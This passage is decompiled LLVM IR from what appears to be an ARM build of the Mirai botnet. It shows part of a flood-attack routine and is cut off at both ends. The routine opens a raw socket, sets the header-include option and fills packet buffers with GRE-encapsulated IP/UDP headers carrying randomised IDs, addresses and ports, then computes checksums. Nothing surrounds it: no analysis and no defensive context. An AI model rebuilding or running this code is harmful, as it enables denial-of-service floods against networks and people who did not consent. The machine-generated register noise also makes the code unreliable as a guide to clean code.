  store i32 7, i32* %r2.global-to-local, align 4
  %v0_8968 = load i32, i32* @r5, align 4
  store i32 %v0_8968, i32* %r0.global-to-local, align 4
  %v5_896c = inttoptr i32 %v0_895c to i32*
  %v6_896c = call i32 @attack_get_opt_int(i32 %v0_8968, i32* %v5_896c, i32 7, i32 65535, i32 %v6_8950)
  %v0_8970 = load i32, i32* @r4, align 4
  store i32 %v0_8970, i32* %r1.global-to-local, align 4
  %v0_8974 = load i32, i32* @sb, align 4
  store i32 %v0_8974, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v6_896c, i32* @r8, align 4
  %v0_8980 = load i32, i32* @r5, align 4
  store i32 %v0_8980, i32* %r0.global-to-local, align 4
  %v5_8984 = inttoptr i32 %v0_8970 to i32*
  %v6_8984 = call i32 @attack_get_opt_int(i32 %v0_8980, i32* %v5_8984, i32 %v0_8974, i32 512, i32 ptrtoint (i32* @0 to i32))
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_8994 = load i32, i32* @r4, align 4
  store i32 %v0_8994, i32* %r1.global-to-local, align 4
  %v0_8998 = load i32, i32* @r5, align 4
  store i32 %v0_8998, i32* %r0.global-to-local, align 4
  %v5_899c = inttoptr i32 %v0_8994 to i32*
  %v6_899c = call i32 @attack_get_opt_int(i32 %v0_8998, i32* %v5_899c, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v1_89a4 = urem i32 %v6_899c, 256
  store i32 %v1_89a4, i32* %ip.global-to-local, align 4
  %v0_89a8 = load i32, i32* @r4, align 4
  store i32 %v0_89a8, i32* %r1.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  %v0_89b0 = load i32, i32* @sb, align 4
  store i32 %v0_89b0, i32* %r3.global-to-local, align 4
  %v0_89b4 = load i32, i32* @r5, align 4
  store i32 %v0_89b4, i32* %r0.global-to-local, align 4
  %v5_89bc = inttoptr i32 %v0_89a8 to i32*
  %v6_89bc = call i32 @attack_get_opt_int(i32 %v0_89b4, i32* %v5_89bc, i32 18, i32 %v0_89b0, i32 %v1_89a4)
  %v0_89c4 = load i32, i32* @r4, align 4
  store i32 %v0_89c4, i32* %r1.global-to-local, align 4
  %v2_89c8 = load i32, i32* @global_var_23a4c.55, align 4
  store i32 %v2_89c8, i32* %r3.global-to-local, align 4
  store i32 %v6_89bc, i32* @r7, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  %v0_89d4 = load i32, i32* @r5, align 4
  store i32 %v0_89d4, i32* %r0.global-to-local, align 4
  %v5_89d8 = inttoptr i32 %v0_89c4 to i32*
  %v6_89d8 = call i32 @attack_get_opt_int(i32 %v0_89d4, i32* %v5_89d8, i32 24, i32 %v2_89c8, i32 ptrtoint (i32* @0 to i32))
  %v0_89e0 = load i32, i32* @sb, align 4
  store i32 %v0_89e0, i32* %r0.global-to-local, align 4
  %v1_89e4 = inttoptr i32 %v0_89e0 to i32*
  %v2_89e4 = call i32 @__GI_time(i32* %v1_89e4)
  %v1_89e8 = load i32, i32* @r6, align 4
  %v2_89e8 = add i32 %v1_89e8, %v2_89e4
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_89fc = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_89fc, i32* %r0.global-to-local, align 4
  %v7_8a00 = icmp eq i32 %v3_89fc, -1
  store i1 %v7_8a00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8a00, label %dec_label_pc_8f38, label %dec_label_pc_8a0c

dec_label_pc_8a0c:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_8a14 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_8a14, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  %v0_8a1c = load i32, i32* @sb, align 4
  store i32 %v0_8a1c, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_8a28 = call i32 @__GI_setsockopt(i32 %v3_89fc, i32 %v0_8a1c, i32 3, i32 %v6_8a14, i32 4)
  store i32 %v5_8a28, i32* %r0.global-to-local, align 4
  %v7_8a2c = icmp eq i32 %v5_8a28, -1
  store i1 %v7_8a2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8a2c, label %dec_label_pc_8f44, label %dec_label_pc_8a34

dec_label_pc_8a34:                                ; preds = %dec_label_pc_8a0c
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v3_8a3c = mul i32 %v6_8950, 65536
  store i32 %v3_8a3c, i32* %r1.global-to-local, align 4
  %v0_8a40 = load i32, i32* @r8, align 4
  %v0_8a44 = load i32, i32* %fp.global-to-local, align 4
  %v3_8a44 = mul i32 %v0_8a44, 65536
  store i32 %v3_8a44, i32* %fp.global-to-local, align 4
  %v0_8a48 = load i32, i32* @r7, align 4
  %v1_8a48 = urem i32 %v0_8a48, 256
  store i32 %v1_8a48, i32* @r7, align 4
  %v3_8a4c = urem i32 %v0_8a44, 65536
  store i32 %v3_8a4c, i32* %r3.global-to-local, align 4
  %v3_8a50 = urem i32 %v6_8950, 65536
  store i32 %v3_8a50, i32* %ip.global-to-local, align 4
  %v3_8a54 = urem i32 %v0_8a40, 65536
  %v2_8a58 = icmp eq i32 %arg2, 0
  store i1 %v2_8a58, i1* %cpsr_z.global-to-local, align 1
  %v0_8a68 = load i32, i32* @sb, align 4
  store i32 %v0_8a68, i32* %stack_var_-44, align 4
  br i1 %v2_8a58, label %dec_label_pc_8c70.preheader, label %dec_label_pc_8a7c

dec_label_pc_8a7c:                                ; preds = %dec_label_pc_8a34
  %v3_8a40 = mul i32 %v0_8a40, 65536
  %v3_8a80 = mul i32 %v6_8984, 65536
  %v1_8a84 = add i32 %v3_8a80, 4325376
  %v0_8a44.not = or i32 %v0_8a44, -65536
  %v1_8a88 = xor i32 %v0_8a44.not, 65535
  %v3_8a94 = mul i32 %v1_8a88, 65536
  store i32 %v3_8a94, i32* @r6, align 4
  %tmp68 = udiv i32 %v1_8a84, 256
  %v3_8aac = and i32 %tmp68, 65280
  store i32 %v3_8aac, i32* %r3.global-to-local, align 4
  %v1_8ab0 = add i32 %v3_8a80, 524288
  %tmp69 = mul i32 %v0_8a44, 256
  %v3_8ab4 = and i32 %tmp69, 65280
  %v1_8ab8 = add i32 %v3_8a80, 1835008
  %tmp70 = mul nsw i32 %v1_8a88, 256
  %v3_8abc = and i32 %tmp70, 65280
  %v4_8ac0 = udiv i32 %v1_8a84, 16777216
  %v5_8ac0 = or i32 %v4_8ac0, %tmp68
  %v3_8ac8 = udiv i32 %v1_8ab8, 256
  %v5_8acc = trunc i32 %v5_8ac0 to i16
  %tmp71 = udiv i32 %v0_8a44, 256
  %v4_8ad0 = urem i32 %tmp71, 256
  %v5_8ad0 = or i32 %v4_8ad0, %v3_8ab4
  store i32 %v5_8ad0, i32* @r7, align 4
  %tmp72 = udiv i32 %v1_8a88, 256
  %v4_8ad4 = urem i32 %tmp72, 256
  %v5_8ad4 = or i32 %v4_8ad4, %v3_8abc
  store i32 %v5_8ad4, i32* @fp, align 4
  store i32 %v3_8a40, i32* %r2.global-to-local, align 4
  store i32 %v3_8a3c, i32* %r1.global-to-local, align 4
  %v1_8ae0 = and i32 %v3_8ac8, 65280
  %tmp73 = mul i32 %v6_8950, 256
  %v3_8ae4 = and i32 %tmp73, 65280
  %tmp74 = mul i32 %v0_8a40, 256
  %v3_8ae8 = and i32 %tmp74, 65280
  %v4_8af0 = udiv i32 %v1_8ab8, 16777216
  %v5_8af0 = or i32 %v1_8ae0, %v4_8af0
  store i32 %v5_8af0, i32* @r5, align 4
  %tmp75 = udiv i32 %v6_8950, 256
  %v4_8af4 = urem i32 %tmp75, 256
  %v5_8af4 = or i32 %v4_8af4, %v3_8ae4
  store i32 %v5_8af4, i32* %r0.global-to-local, align 4
  %tmp76 = udiv i32 %v0_8a40, 256
  %v4_8af8 = urem i32 %tmp76, 256
  %v5_8af8 = or i32 %v4_8af8, %v3_8ae8
  store i32 %v5_8af8, i32* %ip.global-to-local, align 4
  %tmp77 = udiv i32 %v1_8ab0, 256
  %v3_8afc = and i32 %tmp77, 65280
  store i32 %v3_8afc, i32* @lr, align 4
  %v5_8b08 = trunc i32 %v5_8af0 to i16
  %v4_8b0c = udiv i32 %v1_8ab0, 16777216
  %v5_8b0c = or i32 %v3_8afc, %v4_8b0c
  store i32 %v5_8b0c, i32* @r8, align 4
  store i32 %v0_8a68, i32* @r4, align 4
  %v1_8b74 = trunc i32 %v6_890c to i8
  %v2_8c28 = icmp eq i32 %v1_8a48, 0
  %sext = mul nuw i32 %v5_8af4, 65536
  %v4_8c4c = sdiv i32 %sext, 65536
  %sext7 = mul nuw i32 %v5_8af8, 65536
  %v4_8c54 = sdiv i32 %sext7, 65536
  br label %dec_label_pc_8b14

dec_label_pc_8b14:                                ; preds = %bb80, %dec_label_pc_8a7c
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_8b20 = call i32 @calloc(i32 1510, i32 4)
  store i32 %v2_8b20, i32* %r0.global-to-local, align 4
  %v3_8b28 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_8b28, i32* %r2.global-to-local, align 4
  %v2_8b2c = load i32, i32* @r4, align 4
  %v5_8b2c = mul i32 %v2_8b2c, 4
  %v6_8b2c = add i32 %v5_8b2c, %v2_88b8
  %v7_8b2c = inttoptr i32 %v6_8b2c to i32*
  store i32 %v2_8b20, i32* %v7_8b2c, align 4
  store i32 %v2_88b8, i32* %r1.global-to-local, align 4
  %v0_8b34 = load i32, i32* %r2.global-to-local, align 4
  %v3_8b34 = mul i32 %v0_8b34, 32
  store i32 %v3_8b34, i32* %r3.global-to-local, align 4
  %v4_8b38 = mul i32 %v0_8b34, 4
  %v5_8b38 = add i32 %v4_8b38, %v2_88b8
  %v6_8b38 = inttoptr i32 %v5_8b38 to i32*
  %v7_8b38 = load i32, i32* %v6_8b38, align 4
  store i32 %v7_8b38, i32* %r4.global-to-local, align 4
  %v5_8b3c = mul i32 %v0_8b34, 24
  store i32 %v5_8b3c, i32* %r3.global-to-local, align 4
  %v1_8b40 = load i32, i32* @sl, align 4
  %v2_8b40 = add i32 %v1_8b40, %v5_8b3c
  store i32 %v2_8b40, i32* %lr.global-to-local, align 4
  %v1_8b44 = inttoptr i32 %v7_8b38 to i8*
  %v2_8b44 = load i8, i8* %v1_8b44, align 1
  %tmp = urem i8 %v2_8b44, 16
  %v1_8b48 = zext i8 %tmp to i32
  %v1_8b4c = or i32 %v1_8b48, 64
  store i32 %v1_8b4c, i32* %r3.global-to-local, align 4
  %v1_8b50 = trunc i32 %v1_8b4c to i8
  store i8 %v1_8b50, i8* %v1_8b44, align 1
  %v0_8b54 = load i32, i32* %r4.global-to-local, align 4
  %v1_8b54 = inttoptr i32 %v0_8b54 to i8*
  %v2_8b54 = load i8, i8* %v1_8b54, align 1
  %v1_8b58 = and i8 %v2_8b54, -16
  %v1_8b5c = or i8 %v1_8b58, 5
  store i32 %v1_8938, i32* %r3.global-to-local, align 4
  store i8 %v1_8b5c, i8* %v1_8b54, align 1
  store i32 %v6_88d0, i32* %r1.global-to-local, align 4
  %v2_8b6c = load i32, i32* %r4.global-to-local, align 4
  %v3_8b6c = add i32 %v2_8b6c, 1
  %v4_8b6c = inttoptr i32 %v3_8b6c to i8*
  store i8 %v5_88f0, i8* %v4_8b6c, align 1
  store i32 %v1_8914, i32* %r2.global-to-local, align 4
  %v2_8b74 = load i32, i32* %r4.global-to-local, align 4
  %v3_8b74 = add i32 %v2_8b74, 8
  %v4_8b74 = inttoptr i32 %v3_8b74 to i8*
  store i8 %v1_8b74, i8* %v4_8b74, align 1
  %v0_8b78 = load i32, i32* %r3.global-to-local, align 4
  %v2_8b78 = icmp eq i32 %v0_8b78, 0
  store i1 %v2_8b78, i1* %cpsr_z.global-to-local, align 1
  %v2_8b80 = load i32, i32* %r4.global-to-local, align 4
  %v3_8b80 = add i32 %v2_8b80, 2
  %v4_8b80 = inttoptr i32 %v3_8b80 to i16*
  store i16 %v5_8acc, i16* %v4_8b80, align 2
  %v2_8b88 = load i32, i32* %r4.global-to-local, align 4
  %v3_8b88 = add i32 %v2_8b88, 9
  %v4_8b88 = inttoptr i32 %v3_8b88 to i8*
  store i8 47, i8* %v4_8b88, align 1
  store i32 %v6_89d8, i32* %r3.global-to-local, align 4
  %v1_8b90 = load i32, i32* %r4.global-to-local, align 4
  %v2_8b90 = add i32 %v1_8b90, 12
  %v3_8b90 = inttoptr i32 %v2_8b90 to i32*
  store i32 %v6_89d8, i32* %v3_8b90, align 4
  %v0_8b94 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_8b94, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_8b14
  store i32 64, i32* %r2.global-to-local, align 4
  %v3_8b98 = load i32, i32* %r4.global-to-local, align 4
  %v4_8b98 = add i32 %v3_8b98, 6
  %v5_8b98 = inttoptr i32 %v4_8b98 to i16*
  store i16 64, i16* %v5_8b98, align 2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_8b14, %bb
  %v0_8b9c = load i32, i32* %lr.global-to-local, align 4
  %v1_8b9c = add i32 %v0_8b9c, 16
  %v2_8b9c = inttoptr i32 %v1_8b9c to i32*
  %v3_8b9c = load i32, i32* %v2_8b9c, align 4
  store i32 22528, i32* %ip.global-to-local, align 4
  %v1_8ba4 = load i32, i32* %r4.global-to-local, align 4
  %v2_8ba4 = add i32 %v1_8ba4, 16
  %v3_8ba4 = inttoptr i32 %v2_8ba4 to i32*
  store i32 %v3_8b9c, i32* %v3_8ba4, align 4
  %v0_8ba8 = load i32, i32* %r4.global-to-local, align 4
  %v1_8ba8 = add i32 %v0_8ba8, 24
  store i32 %v1_8ba8, i32* %r0.global-to-local, align 4
  %v1_8bac = add i32 %v0_8ba8, 20
  store i32 %v1_8bac, i32* %r1.global-to-local, align 4
  %v0_8bb0 = load i32, i32* %ip.global-to-local, align 4
  %v1_8bb0 = add i32 %v0_8bb0, 101
  store i32 %v1_8bb0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v0_8bbc = load i32, i32* @r7, align 4
  %v1_8bbc = trunc i32 %v0_8bbc to i16
  %v3_8bbc = add i32 %v0_8ba8, 4
  %v4_8bbc = inttoptr i32 %v3_8bbc to i16*
  store i16 %v1_8bbc, i16* %v4_8bbc, align 2
  %v0_8bc0 = load i32, i32* %ip.global-to-local, align 4
  %v1_8bc0 = trunc i32 %v0_8bc0 to i16
  %v2_8bc0 = load i32, i32* %r1.global-to-local, align 4
  %v3_8bc0 = add i32 %v2_8bc0, 2
  %v4_8bc0 = inttoptr i32 %v3_8bc0 to i16*
  store i16 %v1_8bc0, i16* %v4_8bc0, align 2
  %v0_8bc4 = load i32, i32* %r3.global-to-local, align 4
  %v1_8bc4 = trunc i32 %v0_8bc4 to i8
  %v2_8bc4 = load i32, i32* %r0.global-to-local, align 4
  %v3_8bc4 = add i32 %v2_8bc4, 13
  %v4_8bc4 = inttoptr i32 %v3_8bc4 to i8*
  store i8 %v1_8bc4, i8* %v4_8bc4, align 1
  %v0_8bc8 = load i32, i32* %r2.global-to-local, align 4
  %v1_8bc8 = trunc i32 %v0_8bc8 to i8
  %v2_8bc8 = load i32, i32* %r0.global-to-local, align 4
  %v3_8bc8 = add i32 %v2_8bc8, 12
  %v4_8bc8 = inttoptr i32 %v3_8bc8 to i8*
  store i8 %v1_8bc8, i8* %v4_8bc8, align 1
  %v0_8bcc = load i32, i32* %r4.global-to-local, align 4
  %v1_8bcc = add i32 %v0_8bcc, 38
  %v2_8bcc = inttoptr i32 %v1_8bcc to i8*
  %v3_8bcc = load i8, i8* %v2_8bcc, align 1
  %tmp86 = urem i8 %v3_8bcc, 16
  %v1_8bd0 = zext i8 %tmp86 to i32
  %v1_8bd4 = or i32 %v1_8bd0, 64
  store i32 %v1_8bd4, i32* %r3.global-to-local, align 4
  %v1_8bd8 = trunc i32 %v1_8bd4 to i8
  store i8 %v1_8bd8, i8* %v2_8bcc, align 1
  %v0_8bdc = load i32, i32* %r4.global-to-local, align 4
  %v1_8bdc = add i32 %v0_8bdc, 38
  %v2_8bdc = inttoptr i32 %v1_8bdc to i8*
  %v3_8bdc = load i8, i8* %v2_8bdc, align 1
  %v4_8bdc = zext i8 %v3_8bdc to i32
  %v1_8be0 = and i32 %v4_8bdc, 240
  %v1_8be4 = or i32 %v1_8be0, 5
  store i32 %v1_8be4, i32* %r2.global-to-local, align 4
  %v1_8be8 = trunc i32 %v1_8be4 to i8
  store i8 %v1_8be8, i8* %v2_8bdc, align 1
  store i32 %v6_88d0, i32* %ip.global-to-local, align 4
  %v0_8bf0 = load i32, i32* %r4.global-to-local, align 4
  %v1_8bf0 = add i32 %v0_8bf0, 38
  store i32 %v1_8bf0, i32* @r5, align 4
  %v3_8bf4 = add i32 %v0_8bf0, 39
  %v4_8bf4 = inttoptr i32 %v3_8bf4 to i8*
  store i8 %v5_88f0, i8* %v4_8bf4, align 1
  store i32 %v5_8af0, i32* %lr.global-to-local, align 4
  %v2_8bfc = load i32, i32* @r5, align 4
  %v3_8bfc = add i32 %v2_8bfc, 2
  %v4_8bfc = inttoptr i32 %v3_8bfc to i16*
  store i16 %v5_8b08, i16* %v4_8bfc, align 2
  store i32 %v1_8914, i32* %r1.global-to-local, align 4
  %v0_8c04 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_8c04, label %.thread8, label %bb78

.thread8:                                         ; preds = %.thread
  store i32 17, i32* %r3.global-to-local, align 4
  br label %bb79

bb78:                                             ; preds = %.thread
  store i32 64, i32* %r2.global-to-local, align 4
  store i32 17, i32* %r3.global-to-local, align 4
  %v3_8c0c = load i32, i32* @r5, align 4
  %v4_8c0c = add i32 %v3_8c0c, 6
  %v5_8c0c = inttoptr i32 %v4_8c0c to i16*
  store i16 64, i16* %v5_8c0c, align 2
  %v0_8c10.pre = load i32, i32* %r1.global-to-local, align 4
  %extract.t85 = trunc i32 %v0_8c10.pre to i8
  br label %bb79

bb79:                                             ; preds = %.thread8, %bb78
  %v6_890c.sink.off0 = phi i8 [ %v1_8b74, %.thread8 ], [ %extract.t85, %bb78 ]
  %v2_8c10 = load i32, i32* @r5, align 4
  %v3_8c10 = add i32 %v2_8c10, 8
  %v4_8c10 = inttoptr i32 %v3_8c10 to i8*
  store i8 %v6_890c.sink.off0, i8* %v4_8c10, align 1
  %v0_8c14 = load i32, i32* %r3.global-to-local, align 4
  %v1_8c14 = trunc i32 %v0_8c14 to i8
  %v2_8c14 = load i32, i32* @r5, align 4
  %v3_8c14 = add i32 %v2_8c14, 9
  %v4_8c14 = inttoptr i32 %v3_8c14 to i8*
  store i8 %v1_8c14, i8* %v4_8c14, align 1
  %v0_8c18 = load i32, i32* @fp, align 4
  %v1_8c18 = trunc i32 %v0_8c18 to i16
  %v2_8c18 = load i32, i32* @r5, align 4
  %v3_8c18 = add i32 %v2_8c18, 4
  %v4_8c18 = inttoptr i32 %v3_8c18 to i16*
  store i16 %v1_8c18, i16* %v4_8c18, align 2
  %v0_8c1c = call i32 @rand_next()
  store i32 %v0_8c1c, i32* %r0.global-to-local, align 4
  store i32 %v1_8a48, i32* %ip.global-to-local, align 4
  store i1 %v2_8c28, i1* %cpsr_z.global-to-local, align 1
  %v1_8c2c = sub i32 1023, %v0_8c1c
  store i32 %v1_8c2c, i32* %r3.global-to-local, align 4
  br i1 %v2_8c28, label %.thread9, label %.thread10

.thread9:                                         ; preds = %bb79
  %v2_8c34 = load i32, i32* @r5, align 4
  %v3_8c34 = add i32 %v2_8c34, 16
  %v4_8c34 = inttoptr i32 %v3_8c34 to i32*
  store i32 %v1_8c2c, i32* %v4_8c34, align 4
  br label %bb80

.thread10:                                        ; preds = %bb79
  %v1_8c30 = load i32, i32* %r4.global-to-local, align 4
  %v2_8c30 = add i32 %v1_8c30, 16
  %v3_8c30 = inttoptr i32 %v2_8c30 to i32*
  %v4_8c30 = load i32, i32* %v3_8c30, align 4
  store i32 %v4_8c30, i32* %r3.global-to-local, align 4
  %v2_8c38 = load i32, i32* @r5, align 4
  %v3_8c38 = add i32 %v2_8c38, 16
  %v4_8c38 = inttoptr i32 %v3_8c38 to i32*
  store i32 %v4_8c30, i32* %v4_8c38, align 4
  br label %bb80

bb80:                                             ; preds = %.thread9, %.thread10
  %v1_8c3c = load i32, i32* @r5, align 4
  %v2_8c3c = add i32 %v1_8c3c, 12
  %v3_8c3c = inttoptr i32 %v2_8c3c to i32*
  store i32 %v0_8c1c, i32* %v3_8c3c, align 4
  %v3_8c40 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_8c40, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @lr, align 4
  %v0_8c48 = load i32, i32* %r4.global-to-local, align 4
  %v1_8c48 = add i32 %v0_8c48, 58
  store i32 %v1_8c48, i32* @r6, align 4
  store i32 %v4_8c4c, i32* %r1.global-to-local, align 4
  %v1_8c50 = add i32 %v3_8c40, 1
  store i32 %v1_8c50, i32* @r4, align 4
  store i32 %v4_8c54, i32* %r2.global-to-local, align 4
  %v9_8c58 = icmp eq i32 %v1_8c50, %arg2
  store i1 %v9_8c58, i1* %cpsr_z.global-to-local, align 1
  %v0_8c5c = load i32, i32* @r8, align 4
  %v1_8c5c = trunc i32 %v0_8c5c to i16
  %v3_8c5c = add i32 %v0_8c48, 62
  %v4_8c5c = inttoptr i32 %v3_8c5c to i16*
  store i16 %v1_8c5c, i16* %v4_8c5c, align 2
  %v0_8c60 = load i32, i32* %r1.global-to-local, align 4
  %v1_8c60 = trunc i32 %v0_8c60 to i16
  %v2_8c60 = load i32, i32* @r6, align 4
  %v3_8c60 = inttoptr i32 %v2_8c60 to i16*
  store i16 %v1_8c60, i16* %v3_8c60, align 2
  %v0_8c64 = load i32, i32* %r2.global-to-local, align 4
  %v1_8c64 = trunc i32 %v0_8c64 to i16
  %v2_8c64 = load i32, i32* @r6, align 4
  %v3_8c64 = add i32 %v2_8c64, 2
  %v4_8c64 = inttoptr i32 %v3_8c64 to i16*
  store i16 %v1_8c64, i16* %v4_8c64, align 2
  %v0_8c68 = load i32, i32* @r4, align 4
  store i32 %v0_8c68, i32* %stack_var_-44, align 4
  %v5_8c6c = icmp slt i32 %v1_8c50, %arg2
  br i1 %v5_8c6c, label %dec_label_pc_8b14, label %dec_label_pc_8c70.preheader

dec_label_pc_8c70.preheader:                      ; preds = %bb80, %dec_label_pc_8a34
  %v1_8c8c = add i32 %v6_8984, 8
  %v1_8c90 = add i32 %v6_8984, 66
  %v2_8c9c = icmp eq i32 %v6_89d8, -1
  %v7_8c9c = icmp eq i32 %v6_89d8, -1
  %v3_8e94 = icmp eq i32 %v3_8a4c, 65535
  %v2_8ee4 = icmp eq i32 %v1_8a48, 0
  %v2_8cf8 = ptrtoint i32* %stack_var_-48 to i32
  %v2_8d10 = ptrtoint i32* %stack_var_-52 to i32
  %v2_8d20 = ptrtoint i32* %stack_var_-56 to i32
  %v2_8d2c = ptrtoint i32* %stack_var_-54 to i32
  %v2_8d40 = icmp eq i32 %v1_89a4, 0
  br label %dec_label_pc_8c70

dec_label_pc_8c70:                                ; preds = %dec_label_pc_8c70.preheader, %dec_label_pc_8f24
  store i1 %v2_8a58, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_8a58, label %dec_label_pc_8f24, label %dec_label_pc_8c84

dec_label_pc_8c84:                                ; preds = %dec_label_pc_8c70
  store i32 %v6_8984, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v1_8c8c, i32* @fp, align 4
  store i32 %v1_8c90, i32* @sb, align 4
  br label %dec_label_pc_8df8

dec_label_pc_8c98:                                ; preds = %dec_label_pc_8df8
  store i32 %v6_89d8, i32* %r1.global-to-local, align 4
  store i1 %v7_8c9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8c9c, label %dec_label_pc_8e84, label %dec_label_pc_8ca4

dec_label_pc_8ca4:                                ; preds = %dec_label_pc_8e24, %dec_label_pc_8c98
  store i32 %v3_8a4c, i32* %r2.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_8e94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_8e94, label %dec_label_pc_8ea0, label %dec_label_pc_8cb8

dec_label_pc_8cb8:                                ; preds = %dec_label_pc_8e84.dec_label_pc_8cb8_crit_edge, %dec_label_pc_8ca4
  %v1_8cbc = phi i32 [ %v1_8cbc.pre, %dec_label_pc_8e84.dec_label_pc_8cb8_crit_edge ], [ 65535, %dec_label_pc_8ca4 ]
  store i32 %v3_8a50, i32* %r3.global-to-local, align 4
  %v9_8cbc = icmp eq i32 %v3_8a50, %v1_8cbc
  store i1 %v9_8cbc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8cbc, label %dec_label_pc_8ec8, label %dec_label_pc_8cc4

dec_label_pc_8cc4:                                ; preds = %dec_label_pc_8ea0, %dec_label_pc_8cb8
  %v1_8cc8 = phi i32 [ %v1_8ec0, %dec_label_pc_8ea0 ], [ %v1_8cbc, %dec_label_pc_8cb8 ]
  store i32 %v3_8a54, i32* %ip.global-to-local, align 4
  %v9_8cc8 = icmp eq i32 %v3_8a54, %v1_8cc8
  store i1 %v9_8cc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8cc8, label %dec_label_pc_8edc, label %dec_label_pc_8cd0

dec_label_pc_8cd0:                                ; preds = %dec_label_pc_8ec8, %dec_label_pc_8cc4
  store i32 %v1_8a48, i32* @lr, align 4
  store i1 %v2_8ee4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8ee4, label %dec_label_pc_8ef8, label %.thread11

.thread11:                                        ; preds = %dec_label_pc_8cd0
  %v1_8cd8 = load i32, i32* @r5, align 4
  %v2_8cd8 = add i32 %v1_8cd8, 16
  %v3_8cd8 = inttoptr i32 %v2_8cd8 to i32*
  %v4_8cd8 = load i32, i32* %v3_8cd8, align 4
  store i32 %v4_8cd8, i32* %r3.global-to-local, align 4
  %v2_8cdc = load i32, i32* @r6, align 4
  %v3_8cdc = add i32 %v2_8cdc, 16
  %v4_8cdc = inttoptr i32 %v3_8cdc to i32*
  store i32 %v4_8cd8, i32* %v4_8cdc, align 4
  br label %dec_label_pc_8ce4

dec_label_pc_8ce4:                                ; preds = %bb81, %.thread11, %dec_label_pc_8ef8
  %v0_8ce4 = call i32 @rand_next()
  store i32 %v0_8ce4, i32* %r0.global-to-local, align 4
  store i32 %v0_8ce4, i32* %stack_var_-48, align 4
  %v0_8cec = call i32 @rand_next()
  store i32 %v0_8cec, i32* %r0.global-to-local, align 4
  store i32 %v0_8cec, i32* %stack_var_-52, align 4
  %v0_8cf4 = call i32 @rand_next()
  store i32 %v2_8cf8, i32* %r1.global-to-local, align 4
  store i32 %v0_8cf4, i32* %stack_var_-56, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_8d04 = load i32, i32* @r7, align 4
  store i32 %v0_8d04, i32* %r0.global-to-local, align 4
  %v3_8d08 = call i32 @util_memcpy(i32 %v0_8d04, i32 %v2_8cf8, i32 4)
  %v0_8d0c = load i32, i32* @r7, align 4
  %v1_8d0c = add i32 %v0_8d0c, 6
  store i32 %v1_8d0c, i32* %r0.global-to-local, align 4
  store i32 %v2_8d10, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v3_8d18 = call i32 @util_memcpy(i32 %v1_8d0c, i32 %v2_8d10, i32 4)
  %v0_8d1c = load i32, i32* @r7, align 4
  %v1_8d1c = add i32 %v0_8d1c, 4
  store i32 %v1_8d1c, i32* %r0.global-to-local, align 4
  store i32 %v2_8d20, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_8d28 = call i32 @util_memcpy(i32 %v1_8d1c, i32 %v2_8d20, i32 2)
  store i32 %v2_8d2c, i32* %r1.global-to-local, align 4
  %v0_8d30 = load i32, i32* @r7, align 4
  %v1_8d30 = add i32 %v0_8d30, 10
  store i32 %v1_8d30, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_8d38 = call i32 @util_memcpy(i32 %v1_8d30, i32 %v2_8d2c, i32 2)
  store i32 %v3_8d38, i32* %r0.global-to-local, align 4
  store i32 %v1_89a4, i32* %r1.global-to-local, align 4
  store i1 %v2_8d40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8d40, label %dec_label_pc_8d48, label %dec_label_pc_8f04

dec_label_pc_8d48:                                ; preds = %dec_label_pc_8ce4, %dec_label_pc_8f04
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_8d4c = load i32, i32* @r5, align 4
  %v3_8d4c = add i32 %v2_8d4c, 10
  %v4_8d4c = inttoptr i32 %v3_8d4c to i16*
  store i16 0, i16* %v4_8d4c, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_8d54 = load i32, i32* @r5, align 4
  store i32 %v0_8d54, i32* @r0, align 4
  %v2_8d58 = call i32 @checksum_generic(i32 %v0_8d54, i32 20)
  %v3_8d58 = trunc i32 %v2_8d58 to i16
  store i32 0, i32* %ip.global-to-local, align 4
  %v3_8d60 = load i32, i32* @r5, align 4
  %v4_8d60 = add i32 %v3_8d60, 10
  %v5_8d60 = inttoptr i32 %v4_8d60 to i16*
